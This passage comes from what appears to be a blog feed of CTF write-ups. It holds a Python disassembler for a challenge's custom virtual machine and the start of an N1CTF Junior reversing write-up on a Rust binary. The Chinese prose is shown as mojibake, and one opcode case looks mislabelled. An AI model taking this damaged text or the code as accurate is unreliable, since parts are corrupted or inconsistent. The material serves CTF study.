punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>  <span class=\"token keyword\">match</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>â€‹     <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>â€‹        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"push reg[0]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>â€‹     <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>â€‹        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"push reg[0]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>â€‹     <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>â€‹        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"push reg[2]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>â€‹     <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>â€‹        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"push reg[3]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre></pre></td></tr><tr><td data-num=\"103\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"106\"></td><td><pre></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>  <span class=\"token keyword\">match</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>â€‹     <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>â€‹        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pop reg[0]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>â€‹     <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>â€‹        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pop reg[0]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>â€‹     <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>â€‹        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pop reg[2]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>â€‹     <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>â€‹        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pop reg[3]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">alu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"132\"></td><td><pre></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>  <span class=\"token keyword\">match</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>â€‹     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"add reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>â€‹     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"sub reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>â€‹     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"mul reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>â€‹     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"xor reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>â€‹     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"shl reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>â€‹     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"shr reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre></pre></td></tr><tr><td data-num=\"161\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">cmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"164\"></td><td><pre></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cmp reg[0],reg[1]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre></pre></td></tr><tr><td data-num=\"169\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">jmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>   <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"172\"></td><td><pre></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>   <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"jmp </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>   ip<span class=\"token operator\">+=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre></pre></td></tr><tr><td data-num=\"177\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">jne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"180\"></td><td><pre></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"jne </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre></pre></td></tr><tr><td data-num=\"185\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">je</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"188\"></td><td><pre></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"je </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre></pre></td></tr><tr><td data-num=\"193\"></td><td><pre><span class=\"token keyword\">while</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token number\">255</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"194\"></td><td><pre></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>  <span class=\"token keyword\">match</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>â€‹       mov<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>â€‹       push<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>â€‹       pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre></pre></td></tr><tr><td data-num=\"209\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>â€‹      alu<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre></pre></td></tr><tr><td data-num=\"213\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"214\"></td><td><pre></pre></td></tr><tr><td data-num=\"215\"></td><td><pre>â€‹      <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"216\"></td><td><pre></pre></td></tr><tr><td data-num=\"217\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"218\"></td><td><pre></pre></td></tr><tr><td data-num=\"219\"></td><td><pre>â€‹      jmp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"220\"></td><td><pre></pre></td></tr><tr><td data-num=\"221\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">6</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"222\"></td><td><pre></pre></td></tr><tr><td data-num=\"223\"></td><td><pre>â€‹      jne<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"224\"></td><td><pre></pre></td></tr><tr><td data-num=\"225\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">7</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"226\"></td><td><pre></pre></td></tr><tr><td data-num=\"227\"></td><td><pre>â€‹      je<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p>\n<p><img data-src=\"/images/image-20230213195038779.png\" alt=\"image.png\"></p>\n<p>é¦–å…ˆ data [0] åˆ° data [39] å…± 40 ä¸ªæ•°æ®ä¸ºè¾“å…¥çš„ flag  åˆ†æè¿™ 39 è¡Œæ±‡ç¼–çŸ¥æ“ä½œä¸º:</p>\n<p>å¯çœ‹å‡ºé€»è¾‘ä¸ºåŠ  data [50+i]ï¼Œå¼‚æˆ– data [100+i]ï¼Œå·¦ç§» 8 ä½ + å³ç§» 8 ä½ï¼Œå¹¶ä¸ data [150+i] é€†åºï¼ˆå› ä¸ºåŠ å¯†åç»“æœå­˜æ”¾åœ¨æ ˆä¸­ï¼‰è¿›è¡Œæ¯”è¾ƒï¼Œå†™è§£å¯†ä»£ç å³å¯:</p>\n<p><img data-src=\"/images/image-20230213195738789.png\" alt=\"image.png\"></p>\n<p>æ€»ç»“:</p>\n<p>è¿™é‡Œæ–¹æ³•æ˜¯æ‰‹å†™åæ±‡ç¼–å™¨è¿˜åŸè™šæ‹Ÿæœºçš„æŒ‡ä»¤ ç®—æ˜¯æ¯”è¾ƒä¸¥è°¨çš„åšæ³•äº†é¡ºä¾¿å­¦ä¹  VM çš„åŸºç¡€å§ è²Œä¼¼å¯ä»¥åŠ¨æ€è°ƒè¯•æ¥åšï¼Ÿ</p>\n<p>è™šæ‹Ÿæœºé¢˜å‹çš„å…³é”®åœ¨äºåˆ†æå‡ºæ¥è™šæ‹Ÿæœºçš„æ•°æ®ç»“æ„ï¼Œå¦‚å¯„å­˜å™¨ï¼Œæ ˆï¼Œå†…å­˜ç­‰ã€‚åœ¨åˆ†æè¿‡ç¨‹ä¸­èƒ½æŠŠå¯„å­˜å™¨åœ¨ IDA ä¸­è¡¨ç¤ºå‡ºæ¥æ˜¯æœ€å¥½çš„ (æ–¹ä¾¿çœ‹ï¼Œå¦‚é¢˜ä¸­åˆ†æå‡ºæ˜¯ç»“æ„ä½“), è¦æŠŠå…³é”®å¯„å­˜å™¨å¦‚ rip å…ˆåˆ†æå‡ºæ¥</p>\n<p>é¢˜ä¸­<s> input</s> (ä¹Ÿå°±æ˜¯è„šæœ¬ä¸­çš„ data) é‚£ä¸ªå¤§æ•°ç»„å…¶å®å°±ç›¸å½“äºæ ˆï¼Œå†…å­˜è¿™ç§ç±»ä¼¼çš„å­˜åœ¨äº† å°±æ˜¯ä¸€ä¸ªç©ºé—´</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/02/04/N1CTF%20Junior%20%20WP%20%20by%203cly/",
            "url": "https://3cly.github.io/2023/02/04/N1CTF%20Junior%20%20WP%20%20by%203cly/",
            "title": "N1CTF Junior  WP",
            "date_published": "2023-02-04T05:02:58.000Z",
            "content_html": "<h1 id=\"n1ctf-junior-wp\"><a class=\"markdownIt-Anchor\" href=\"#n1ctf-junior-wp\">#</a> N1CTF Junior  WP</h1>\n<h2 id=\"reserve\"><a class=\"markdownIt-Anchor\" href=\"#reserve\">#</a> reserve</h2>\n<h3 id=\"checkin-rs\"><a class=\"markdownIt-Anchor\" href=\"#checkin-rs\">#</a> checkin-rs</h3>\n<h4 id=\"é¢˜ç›®åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#é¢˜ç›®åˆ†æ\">#</a> é¢˜ç›®åˆ†æ</h4>\n<p>æ‹¿åˆ°æ–‡ä»¶ ç”±é¢˜ç›®æ ‡é¢˜çŸ¥æ˜¯ rust è¯­è¨€ç¼–å†™çš„ ä¹‹å‰æ²¡æ¥è§¦è¿‡ rust çš„é€†å‘é¢˜åªå¥½ç¡¬ç€å¤´çš®å…ˆæ”¾è¿› IDA çœ‹çœ‹<br>\n<img data-src=\"/images/n1.png\" alt=\"image.png\"><br>\n é¦–å…ˆæœç´¢ main å‡½æ•° æ‰¾åˆ°è¿™ä¸ªå¸¦æœ‰å­—ç¬¦ä¸²çš„å‡½æ•°å°±æ˜¯ä¸»å‡½æ•°äº†<br>\n<img data-src=\"/images/n2.png\" alt=\"image.png\"><br>\nv0 å…ˆæ˜¯èµ‹å€¼äº† 32 å­—èŠ‚ åˆ cpy äº† 14 å­—èŠ‚ æ€»å…±æ˜¯ 46 å­—èŠ‚ é€šè¿‡åŠ¨è°ƒå’Œ lazyIDA å¯æå–å‡ºæ¥<br>\n [0x7D, 0x20, 0x23, 0x22, 0x25, 0x24, 0x68, 0x72, 0x6E, 0x56, 0x79, 0x62, 0x53, 0x79, 0x7D, 0x7A, 0x62, 0x4E, 0x7C, 0x7A, 0x7F, 0x76, 0x73, 0x7F, 0x7B, 0x46, 0x7F, 0x68, 0x6E, 0x78, 0x68, 0x7A, 0x52, 0x7E, 0x5B, 0x50, 0x45, 0x40, 0x5D, 0x4C, 0x46, 0x5C, 0x5A, 0x48, 0x49, 0x5E]<br>\n æœ€åé¢è¿™éƒ¨åˆ†åº”è¯¥å¯¹è§£é¢˜å¸®åŠ©ä¸å¤§ å°±æ˜¯åˆ¤æ–­è¾“å…¥ä¹‹åçš„æˆåŠŸæˆ–å¤±è´¥ ç„¶åé‡Šæ”¾å‰é¢ä½¿ç”¨çš„å†…å­˜ä»€ä¹ˆçš„<br>\n<img data-src=\"/images/n3.png\" alt=\"image.png\"></p>\n<p>ä¸­é—´éƒ¨åˆ†çš„å‰é¢æ˜¯æœ‰å…³çº¿ç¨‹ä½¿ç”¨çš„ä¸€äº›åˆ¤æ–­ï¼Œæ­£å¸¸æƒ…å†µæ²¡æœ‰æŠ¥é”™å°±ä¸ä¼šæ‰§è¡Œ<br>\n<img data-src=\"/images/n4.png\" alt=\"image.png\"><br>\n<img data-src=\"/images/n5.png\" alt=\"image.png\"><br>\n åé¢çš„å¤šçº¿ç¨‹å°±æ˜¯å…³é”®äº†<br>\n<img data-src=\"/images/n6.png\" alt=\"image.png\"><br>\n å¯¹è¿™éƒ¨åˆ† æˆ‘æ˜¨å¤©åŠ¨æ€è°ƒè¯•äº†å¾ˆä¹…æ²¡æœ‰çœ‹æ‡‚ ç„¶å hint1 æ”¾å‡ºæ¥äº† äºæ˜¯å» rust å®˜ç½‘ä¸‹è½½äº† rust åœ¨ VScode ä¸Šç¼–è¯‘äº†ä¸€ä¸ªå¤šçº¿ç¨‹ rust ç¨‹åºæ”¾è¿› IDA çœ‹çœ‹ è¦èƒ½æ‰¾åˆ°çº¿ç¨‹ handler å°±èƒ½æ‰¾åˆ°å…³é”®<br>\n<img data-src=\"/images/n7.png\" alt=\"image.png\"><br>\n<img data-src=\"/images/n8.png\" alt=\"image.png\"> ç„¶åæŸ¥çœ‹ main å‡½æ•°å°±å‘ç° sub_1400027B0 æ˜¯ main å‡½æ•° sub_140002EB0 å°±æ˜¯ handler ç›¸å…³çš„<br>\nè¿™æ—¶å‡†å¤‡å¼€æ‘†äº† æ”¾å‡ºäº†ç¬¬äºŒä¸ª hint å«æˆ‘ä»¬åœ¨ bcmp å‡½æ•°ä¸‹æ–­ç‚¹è§‚å¯Ÿè¾“å…¥çš„å˜åŒ– å°±æ˜¯é»‘ç›’åˆ†æå§<br>\n<img data-src=\"/images/n9.png\" alt=\"image.png\"><br>\nv23 æ˜¯åŠ å¯†åçš„è¾“å…¥<br>\né€šè¿‡å¾ˆå¤šæ¬¡å°è¯• (æ¯”å¦‚è¾“å…¥ 46 ä¸ª 1ï¼Œ16 ä¸ª 1 åé¢æ˜¯ 2ï¼Œsecpunk {},secpunk {11111} ä¹‹ç±»çš„)<br>\n<img data-src=\"/images/n10.png\" alt=\"image.png\"><br>\n å‘ç°è¾“å…¥çš„å­—ç¬¦ä¸²åŠ å¯†åæœ€åä¸€ä¸ªå­—ç¬¦ç»è¿‡åŠ å¯†åæ˜¯ä¸å˜çš„<br>\n<img data-src=\"/images/n11.png\" alt=\"image.png\"><br>\n å‘ç°å‰é¢çš„ v26 å°±æ˜¯è¾“å…¥  v25 æ˜¯åŠ 